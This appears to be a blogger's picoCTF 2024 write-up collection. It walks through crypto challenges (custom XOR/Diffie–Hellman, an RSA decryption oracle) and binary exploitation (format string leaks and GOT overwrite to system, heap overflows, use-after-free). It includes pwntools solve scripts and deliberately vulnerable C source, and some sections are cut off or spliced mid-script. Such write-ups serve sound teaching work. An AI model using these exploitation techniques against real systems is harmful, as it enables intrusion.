If it crashes, the python script itself stops and I couldn't figure a way to make it continue when the "server instance" isn't reachable which means the chrome browser crashed

So because of that I actually had to do manual changing of the index and updating the known flag character leaked

It was quite a bit of pain but after about ~3hours from guessing the right words and brute force we got the flag

After downloading the attached file and checking it I saw it was base64 encoded

We are given a python file and the encoded flag

```python
from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


def encrypt(plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key*311)))
    return cipher


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v > 1:
        return False
    else:
        return True


def dynamic_xor_encrypt(plaintext, text_key):
    cipher_text = ""
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text


def test(plain_text, text_key):
    p = 97
    g = 31

    if not is_prime(p) and not is_prime(g):
        print("Enter prime numbers")
        return
    
    a = randint(p-10, p)
    b = randint(g-10, g)
    # a = 89
    # b = 27
    print(f"a = {a}")
    print(f"b = {b}")

    u = generator(g, a, p)
    v = generator(g, b, p)
    key = generator(v, a, p)
    b_key = generator(u, b, p)

    shared_key = None

    if key == b_key:
        shared_key = key
    else:
        print("Invalid key")
        return
    
    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
    cipher = encrypt(semi_cipher, shared_key)
    print(f'cipher is: {cipher}')


if __name__ == "__main__":
    # message = sys.argv[1]
    test(message, "trudeau")
```

Here's the encoded flag file content

```
a = 89
b = 27
cipher is: [33588, 276168, 261240, 302292, 343344, 328416, 242580, 85836, 82104, 156744, 0, 309756, 78372, 18660, 253776, 0, 82104, 320952, 3732, 231384, 89568, 100764, 22392, 22392, 63444, 22392, 97032, 190332, 119424, 182868, 97032, 26124, 44784, 63444]
```

I'll go through what the encryption scheme is

First it imports two python modules

```python
from random import randint
import sys
```

Then it calls function `test` passing the first argument which is the message as the first parameter and the second parameter is the key

```python
if __name__ == "__main__":
    message = sys.argv[1]
    test(message, "trudeau")
```

Here's the test function code

```python
def test(plain_text, text_key):
    p = 97
    g = 31
    if not is_prime(p) and not is_prime(g):
        print("Enter prime numbers")
        return
    a = randint(p-10, p)
    b = randint(g-10, g)
    print(f"a = {a}")
    print(f"b = {b}")
    u = generator(g, a, p)
    v = generator(g, b, p)
    key = generator(v, a, p)
    b_key = generator(u, b, p)
    shared_key = None
    if key == b_key:
        shared_key = key
    else:
        print("Invalid key")
        return
    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
    cipher = encrypt(semi_cipher, shared_key)
    print(f'cipher is: {cipher}')
```

So it stores two prime number in variable `p & g` and makes sure they are prime

Next it generates `a, b `which are random number between `(p-10) & p` and `(g-10) & g` respectively

We are given the value of `a & b`

It calls function `generator` passing `g, a & p` as the parameter where the result is stored in variable `u` and the same is done with with `g, b, p` which is stored in `v`

Here's what the `generator` function does

```python
def generator(g, x, p):
    return pow(g, x) % p
```

Basically what that does is to take the power of `g` to `x` modded with `p` i.e `(g ** x) mod p`

And it generates `u, v, key & b_key`

This is actually a known cryptography implementation called [Diffie–Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)

But here we are given just the private exponent 

Still we can calculate `u & v`

```python
a, b = 89, 27
p, g = 97, 31

u = generator(g, a, p)
v = generator(g, b, p)
key = generator(v, a, p)
b_key = generator(u, b, p)

assert key == b_key
shared_key = key
```

Back to the code it calls function `dynamic_xor_encrypt` passing the `message & text_key` as the parameter

Here's what it does

```python
def dynamic_xor_encrypt(plaintext, text_key):
    cipher_text = ""
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text
```

So it basically just performs a xor operation but this time it reverses the message string which is then xored

After that it generates a cipher which is the value return from calling function `cipher` passing the xored value and the shared key as the parameter

Here's what the function does

```python
def encrypt(plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key*311)))
    return cipher
```

For each character in the "xored value" it multiplies it by `key*311`

And the result is appended to a cipher list and returned to us

Now how to solve this?

Since we know the key and xor key we can just reverse the process used to encrypt the flag

First we need to deal with the `encrypt` function

```
cipher = char * (key*311)
```

To recover `char` we can simply do this

```
char = cipher // (key*311)
```

Ok that's the first step and with we should retreive the xored value

Now how do we reverse xor?

Well xor is reversible by this

```
a ^ b == c
a ^ c == b
b ^ a == a
```

We can just make use of this commutative property of xor to retrieve the plaintext

```
xored = plaintext ^ key
plaintext = xored ^ key
```

With that said here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Cryptography/Custom%20Encryption/solve.py)

    return semi_cipher

def xor_pwn(enc, key):
    pt = ""
    k_len = len(key)

    for idx, val in enumerate(enc[::-1]):
        k_chr = key[idx % k_len]
        d_chr = chr(ord(k_chr) ^ ord(val))
        pt += d_chr
    
    print(pt[::-1])

a, b = 89, 27
p, g = 97, 31

u = generator(g, a, p)

assert key == b_key

We are given a python file and a ciphertext
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eaca6fac-36c0-4210-a130-bca695fd824c)

```python
import sys
chars = ""
from fileinput import input
for line in input():
  chars += line

lookup1 = "\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"
lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"

out = ""

prev = 0
for char in chars:
  cur = lookup1.index(char)
  out += lookup2[(cur - prev) % 40]
  prev = cur

sys.stdout.write(out)
```

Ok basically this code will iterate through our input and get the index of the current character in the lookup1 string, then it subtracts the index with the prev variable which is set to 0 initially and is modded by 40. The result is used as the index to get the character specified at the string lookup2 and finally it updates the variable `prev` to the current index `cur`

We can easily reverse this process

```python
lookup1 = "\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"
lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"

ciphertext = "DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl"

out = ""

prev = 0
for char in ciphertext:
    cur = lookup2.index(char)
    out += lookup1[(cur + prev) % 40]
    prev = (cur + prev) % 40

print(out)
```

Running that gives another python code

for i in range(len(chars)):
    if i == b * b * b:
        print chars[i] #prints
        b += 1 / 1
```

Hmm nothing sus there

I just stored the result obtained from the first reversed operation and used that for this new python code retrieved

And that gave me the word which is the flag

We are given an encoded password and secret file with also a remote instance to connect to

Checking the given files shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8277a05-2dbe-41f3-b49d-8947b88ce8b2)

From the challenge hint we know that we are meant to decrypt the AES encrypted file (secret.enc) but it needs a password

So the password file given is actually the encrypted password also that means we would need to get the plaintext form of the encrypted password

Now that we know that let's connect to the remote instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d01200ac-5123-4153-9ddf-40028a668780)

On connecting to it i saw that this is a service which encrypts and decrypts values for us

We can try to encrypt a word
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c2c423d2-33a2-4691-8088-dc4be7848f67)

Here i encrypted `pwn` and the ciphertext is `2047850252706091840405479775769742652500446636392769116787296844217713229548194309699205024040158803529449603571974932458613731680043863948321059171243239`

Let's decrypt it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4641f65a-9ddd-4ba0-a32c-edaa04b366f6)

Ok nice we can encrypt and decrypt 

So bascially this is an oracle because it's offering to decrypt any ciphertext we give it

And we know that it implements RSA 

For the encryption/decryption part of RSA it computes this:

```
## Encryption
ct = (m ^ e) mod n

## Decryption
m = (ct ^ d) mod n
```

When we try to decrypt the ciphertext we get this error 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f2e78bef-755e-400b-a3ba-49db97e0822b)

So no easy win :)

Now how do we exactly trick this oracle to give me the flag?

I made some research and found [this](https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/)

So here's how to craft the ciphertext

First we already know that the server computes `m = (ct ^ d) mod n and ct = (m ^ e) mod n`

Because the server check that we don’t ask for the decryption of the flag, you can’t give it the ciphertext right away, we need to modify it in a way to trick the server into thinking it’s something else 

The modification must be carefully chosen so that we can revert the process once we get the response of the server

For instance, we can’t just add one and expect to subtract 1 from the output

The trick is the multiply the ciphertext with another ciphertext `ct2` from which we know the plaintext

```
ct2 = (2 ^ e) mod n
```

Now the new ciphertext that you will send to the server will be:

```
C = ct * ct2
  = (m ^ e) * (2 ^ e)
  = ((2m) ^ e)
  = 2m^e
```

The server will give you back:

```
pt = (2(C ^ e) ^ d) mod n
   = 2*m
```

Now we just divide `pt` by 2 and that's the password

You must choose a small value because the computations are made modulo n, so if the result gets too big we wont be able to know the real value

With that said I wrote a solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Cryptography/RSA%20Oracle/solve.py)

```python
from pwn import *
from Crypto.Util.number import long_to_bytes
from warnings import filterwarnings

io = remote("titan.picoctf.net", 61923)
filterwarnings("ignore")

io.sendline("E")
io.sendline(p8(0x2))
io.recvuntil("n) ")

ct1 = int(io.recvline().decode())
ct2 = 2575135950983117315234568522857995277662113128076071837763492069763989760018604733813265929772245292223046288098298720343542517375538185662305577375746934
C = ct1 * ct2
# print(ct1)
# print(ct2)

io.sendline("D")
io.sendline(str(C))

io.recvuntil(": ")
pt = long_to_bytes(int((io.recvline().decode().split()[-1]), 16) // 2)
print(f"AES Password: {pt}")

io.close()
```

Running that we get the aes key which we can then go ahead decrypting `secret.enc`

We are given a binary and the source code with a remote instance to connect to

Downloading the attached file and checking the source shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1a723603-c0a6-4f19-b172-4883ddb79c99)

Since this was the first challenge in this category I felt lazy to read the source code but i saw some interesting things just by looking at it
- The flag is opened and stored in a global variable
- We have have a prompt where we need to choose the right bugger and if we meet certain condition we get another prompt which allows us choose another burger

Ok that doesn't make much sense but looking at the part where we select a burger i saw this

```c
#define BUFSIZE 32

char choice1[BUFSIZE];
scanf("%s", choice1);
char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
if (!on_menu(choice1, menu1, 3)) {
    printf("%s", "There is no such burger yet!\n");
    fflush(stdout);
} else {
    int count = printf(choice1);
    if (count > 2 * BUFSIZE) {
        serve_bob();

```


First we read in the choice using `scanf` and it's stored in the buffer `choice1` then it stores some burgers in the `menu1` array and if our input is among the buffer array then it calls `printf` on our choice and then it saves the return value from calling printf to an integer variable `count` then checks if `count` is greater than `2 * BUFSIZE`. If the check returns True then it calls the `server_bob` function

There are two vulnerabilities here:
- Buffer overflow
- Format String Bug

The first one is when it receives our input, we can see that when it calls `scanf` it doesn't specify to number of bytes to read in which causes the overflow since the choice buffer can only hold up just 32 bytes

So at this point of knowing that I basically just decided to spam 'A's
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f6f3a240-4430-4189-84e9-a37c222539b5)

It also worked remotely
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/872832c7-1d8c-43de-a841-8eb644c08491)

But looking back at the challenge this is probably not a good way to solve this even though it works

So let me talk about the second vuln which is format string bug

I saw that when it wants to store the result of printf to variable count, printf would print out our choice without using a format specifier

That's what leads to the format string bug

But how exactly do we leverage that when it eventually checks if the count is greater than 64 (2 * 32)

Since we are meant to choose from the menu I noticed that `menu1[1]` has a format specifier in it

```
Gr%114d_Cheese
```

In other words when printf is called it would also do `printf(%114d)`

And the return value from calling [printf](https://man7.org/linux/man-pages/man3/printf.3.html#RETURN_VALUE) is the number of characters printed (excluding the null byte used to end output to strings).

So when `%114d` is passed to printf the number of bytes returned would be `114`

We can check this out by making a dummy script --> compiling it and setting a breakpoint after printf is called

```c
#include <stdio.h>

int main(){
    char value[32];
    scanf("%s", value);
    int count = printf(value);
    printf("\nsize: %d\n", count);

    return 0;
}
```

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e30e2e1c-e110-4b87-8144-7e7fd1fc829a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a29076c7-bc3e-4329-a866-f9d1d44f0227)

We can see that `rax` is `0x72 == 144` and that's greater than `64` with that we can get us to the next function `serve_bob`

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7ce57f5-1f93-49e1-bdbd-6b80f058874a)

Now for the next function it's also similar

```c
char choice2[BUFSIZE];
scanf("%s", choice2);
char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
if (!on_menu(choice2, menu2, 3)) {
    printf("%s", "There is no such burger yet!\n");
    fflush(stdout);
} else {
    printf(choice2);
    fflush(stdout);
}
```

We just choose `menu[2]` which then does `printf(%s%s%s)` 

But is that meant to give the flag? 

Rather how did we get the flag initially with the buffer overflow

Well I didn't say this at first but there's a function which handle signals

```c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

signal(SIGSEGV, sigsegv_handler);
```

In this case once the program sees a SIGSEGV signal it would call the handler function which helps us print the flag

That's why the buffer overflow when caused produces a SIGSEGV signal which we then got the flag

To see this we can try it in a debugger and cause an overflow

I set a breakpoint at the point where `server_patrick` function wants to return
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7be06560-8631-4271-be9b-3728279ab33f)

If we move to next instruction we would see that we triggered the SIGSEGV signal
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/21d305bc-34f3-4fdc-b112-d56ba53b8091)

But how exactly can we acheive a SIGSEGV signal with this uncontrollable format string bug

Here's how it's possible, remember that the choice two would do `printf(%s%s%s)`

And what printf would interpret is that:
- Print the string stored in the pointer at the first offset i.e 0xffffffff -> "test"...... so print "test"

But what if that address pointer is invalid what happens? Well the SIGSEGV signal is triggered

So now that we know that, we just choose it and hope the address at the first offset is invalid

Doing that I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7f1a688-04aa-4da4-8af0-662987f4cd84)

```

This function would allocate memory of size 24 on the heap and then move "pico" into `input_data`

Then it also allocates memory of size 5 on the heap and then moves "bico" into `safe_var`

Note that both `input_data & safe_var` are the heap memory address 

Next function:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

This would allow us write any amount of bytes to the `input_data` heap chunk since `scanf` was used without specifying the number of bytes to read in causing a heap overflow since our input is on the "heap"

And finally this function:

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

It checks if `safe_var` isn't `bico` and if it isn't we get the flag

Looking at this we can tell the goal is to overwrite the value of `bico` to anything we want

To do that we need to get the offset between our input and the `safe_var` on the heap

I used pwndbg for this

After running the binary in pwndbg I just `CTRL+C` and looked at the heap chunks
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f2b70153-3b36-4c86-8a75-c53d4982706a)

We see that our input is at `0x5555555596b0` and the address of the value where we want to overwrite is `0x5555555596d0` 

Just take the difference and that gives the offset (32)

Now we can just overwrite the value there

#### Format String 1

Same as usual we are given the source code

Here's the source code

```c
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

First it opens up the file `secret-menu-item-1.txt` and stores the content to `secret1`, then it opens up the flag file and store the content to `flag` and finally opens up `secret-menu-item-2.txt` and stores the content to `secret2`

Next it receives our input using `scanf` and we can read in 1024 bytes which is stored in `buf` 

And lastly it prints out our input using `printf` without using a format specifier

So the vulnerability here is format string bug

And the goal is to get the flag which is stored on the stack

We can leak it using `%p` and also make use of `%{offset}$p` to leak values at specified offset

I wrote a script to achieve this

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%201/solve.py)

```python
from pwn import *

context.log_level = 'info'

flag = ''

for i in range(0, 20):
    try:
        # io = remote('mimas.picoctf.net', 63564, level='warn')
        io = process("./format-string-1")
        io.recvuntil(':')
        io.sendline('%{}$p'.format(i).encode())
        io.recvuntil('order: ')
        result = io.recvline()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

This was the same code as the previous one (heap 0) except that this time the `check_win` function performs operation differently

You can take a look at the source code [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%201/source.c)

Here's the difference:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

This time around it checks if the `safe_var` equals `pico`

That means instead of us overwriting it with junk we should overwrite it to `pico`

The offset was still 32 and with that said here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%201/solve.py)

Almost similar to the previous ones but this time around we it's this:

```c
int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}
```

So it allocates memory of size 5 on the heap where the pointer is stored in `x` and then it moves `bico` to `x` and also `input_data` stores the heap pointer returned by malloc where the size allocated is 5

Our goal is to overwrite the value of `bico` to what?

The check_win condition for this challenge is that it casts the value of `x` as code meaning that it will `call` whatever value is stored in the heap pointer `x` making the program flow will continue from there

Since PIE isn't enabled.......oops I haven't been doing that :(

We can therefore overwrite the value of `bico` to the address of the `win` function so that when we use option `4` it would give us the flag

The offset is at 32

#### Heap 3
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db9942f2-6ee0-4758-930c-15d2b4110167)

This time around the source code is entirely different but yet similiar

You can find the whole source code [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%203/source.c)

Let's see what it does:

First it creates a structure named `object` with 4 fields where each field is of type `char`, then it defines the pointer x which points to the structure created. In the `init` function it sets `x->flag` to `pico` 

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}
```

Now let's see the options it provides
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/48fe1b9c-d71a-4a66-ae99-f3c20e50a314)

We can allocate object and here's the code handling that

```c
void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}
```

We can control the size of what we want to allocate and write to it. Using `scanf` it receives our input which is stored to the pointer we allocated without specifying the number of bytes we can read in causing a heap overflow

We can free the structure pointer `x`, but notice that after it frees the memory it doesn't set it to NULL

```c
void free_memory() {
    free(x);
}
```

And finally to get the flag with option 5 we need to set `x->flag` to `pico`

```c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flag for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}
```

Now what are the bugs so far?
- Heap overflow in `alloc_object()`
- Use after free (UAF) in `free_memory()`

Here's how the exploit flow goes:
- First i free the the struct object
- Then i allocate a new malloc chunk of size 40, i could have just used 35 because that's the size of the struct but i just decided to use 40

Then i fill in the struct 3 fields with junks and on the 30th offset which is where the flag field is `x-flag` i filled it with `pico`

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%203/solve.py)

#### Format String 2

We are given the source code and binary

Checking the source code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1424bd2a-8f10-44e2-a3fa-e9583a1303f5)

Here's what it does:
- It defines a global integer variable `sus` which stores `0x21737573`
- It reads in our input using scanf and stores it in buffer `buf` and prints our input back using `printf`
- If the value of `sus` equals `0x67616c66` we get the flag

From this we can see that the vulnerability is format string bug and our goal is to change the value of `sus` to `0x67616c66`

To do that we need to first get the offset of our input on the stack before printf is called

When using a format specifier, printf will start printing values out, in order of calling convention

Because this is a 64bits binary the calling convention would be:

```
rsi --> rdx --> rcx --> r8 --> r9 --> [rsp] --> [rsp+8] ....
```

Now to get the offset on the stack I set a breakpoint at `main+95` which is the call to `printf@plt`

Starting the process i hit the breakpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/454db117-02ac-4145-acc0-e91a78d0e684)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db49be69-2a5b-4479-8450-7a7a2c4db5fe)

Looking at the first 20 qwords of the stack i got this

```
pwndbg> x/20gx $rsp
0x7fffffffd830: 0x00007ffff7ffe658      0x00007fff00000000
0x7fffffffd840: 0x00007ffff7ffe2d0      0x00000000ffffffff
0x7fffffffd850: 0x00007ffff7fcb7b0      0x00007ffff7ffdab0
0x7fffffffd860: 0x0000000000000001      0x00007fffffffd990
0x7fffffffd870: 0x4141414141414141      0x0000000000000000
0x7fffffffd880: 0x0000000000000000      0x00007ffff7fcbca8
0x7fffffffd890: 0x00007fffffffd9d0      0x00007ffff7fcb7b0
0x7fffffffd8a0: 0x0000000000000006      0x0000001d00000006
0x7fffffffd8b0: 0x00007ffff7ffdab0      0x00007ffff7fd8d2d
0x7fffffffd8c0: 0x0000000000000000      0x00007ffff7fd9f08
pwndbg> 
```

We can see that our offset is at 9 because it contains `0x4141414141414141` but that's not going to be the final value because we need to consider the calling convention so we add 5 making it 14

So that means the offset is 14. Alternatively I wrote a fuzz script which would just get the offset and here's the [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%202/fuzz.py)

With that said we can now easily overwrite the global variable to a desired value using pwntools `fmtstr_payload` function

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%202/solve.py)

#### Format String 3
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c10409d7-837f-4a0c-8e03-f21c2e9c6e4c)

We are given a binary, source code, libc, ld files and a remote instance to connect to

First thing i did was to patch the binary with the provided libc file inorder to make sure that the offsets is the same as the one remotely

Now looking at the source code i saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c2bd877-f3b9-4f56-bc7f-5fe96d668af2)

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```

- Basically it does some buffering on stdin, stdout & stderr and this is defined in function `setup()` so we can just ignore that
- Next it calls function `hello()` which would eventually give us a libc leak and that address is that of `setvbuf`
- Then it receives our input which is stored in `buf` then prints it out
- Before it returns it will basically print out "/bin/sh"

From this we can tell that the vulnerability is format string bug since it prints out our input without a format specifier

Ok now what's the attack strategy?

Looking at the binary protections i got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ddd43129-5f8a-4592-88fe-9b6f10bb7fca)

We are working with a 64bits binary which is dynamically linked and not stripped. The protections enabled are just Stack Canary and NX

The fact that RELRO is partial makes the global offset table (GOT) to be writable 

That means we can overwrite the GOT of any function available

In the previous challenge we had to overwrite a global variable and the same way i got the offset is what i did here too

Here's my fuzzing [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%203/fuzz.py)

Now that we know the offset what should we overwrite?

At the end of the printf call we see that it calls `puts` on `/bin/sh`

So we can overwrite `puts@got` to `system@libc`

But how do we calculate the address of `system` in the `libc`?

Remember that we've been given a libc leak so all i did was to first calculate the libc base address then got the address of system within libc

With that after we perform the overwrite instead of it to call `puts` it would rather spawn a shell

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%203/solve.py)

#### Babygame 03
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6958d38a-3e99-46da-9f8c-a5b65a305b84)

Note that this is a sequel to last year picoctf babygame series so it would help in knowing how to solve the other two

But i'll just try to explain it here 

We are given a binary and no source code with a remote instance to connect to

After downloading the binary i checked the file type and protections enabled
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca28930c-8553-4467-9391-f42647e89fdb)

We are working with a x32 binary which is dynamically linked and not stripped with the only protection being enabled to be NX

Ok let's run the binary to get an overview of what it does

On running it we are presented with a game like sort of structure where we have the: player's position which are shown as the x,y coordinates, current level, end tile position in it's coordinate form and the number of lives left
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/de002451-1a59-4d95-a0bf-a930ff2e39ec)

We are also see that the player is represented by `@`

Initial knowledge of the previous babygame series I saw that we can move around the map using `w,a,s,d`

Ok but this time I want to work on it as if i never did those two previous ones 

So if that was the case we could have just guessed it because that's like the standard gaming key for such type of thing

If we try to send the movement characters with keyboard it will decrement the lives by 2 but that's not meant to be right

Inorder to prevent this I just made a function wrapper to deal with moving the player's character on the map

Before i show that here let's reverse engineer the program to see it's funtionality well and as well the vulnerability

Opening it up and Ghidra and decompiling it, here's the main function:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9cbb261b-28a8-40f5-98cf-cd43ad64f4c2)

It may not look well but that's manageable to read

Ok so let's go through what it does (i'll just give the important portion)

First it initializes the player by calling the `init_player()` function

Looking at the pseudocode shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/360f14ec-59a2-438f-b318-6d7e6796ee25)

```c
void init_player(undefined4 *param_1)

{
  *param_1 = 4;
  param_1[1] = 4;
  param_1[2] = 0x32;
  return;
}
```

We can tell that this is the player's structure because it's setting `y, x, lives` field to the initial value we saw when we ran the program

Inorder for readability I want to create a new struct type in Ghidra called `player` which should be this

```c
typedef struct player {
    int y;
    int x;
    int lives;
} player;
```

To do that look at the "Data Type Manager" tab
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f788796f-1f36-4b5d-a052-a7bdbda52f41)

Then click on `game --> {right click} --> New --> Structure`

Doing that you should get this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/acf1ef29-087e-4d8a-9573-130f9df945c9)

Ok from the fields of the player's structure each is of type `int` and the size of an integer in C is 4 bytes

That means the size of the struct should be 12

So we just add that in the "Structure Editor"
